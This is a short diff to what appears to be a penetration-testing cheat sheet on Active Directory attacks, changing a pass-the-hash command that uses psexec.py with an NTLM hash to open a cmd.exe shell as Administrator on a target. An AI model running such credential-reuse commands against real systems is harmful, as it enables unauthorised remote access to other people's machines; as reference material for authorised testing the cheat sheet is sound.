@@ -47,7 +47,7 @@ Ensure that you added the DC ip into /etc/hosts and set up the DNS into /etc/res
 ### Pass the hash
 
 ```csharp
-./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<HOSTNAME>
+./psexec.py  -hashes AAD3B435B51404EEAAD3B435B51404EE:<NTLM HASH> Administrator@TARGET  cmd.exe
 ```
 
 ### Kerberos ticket
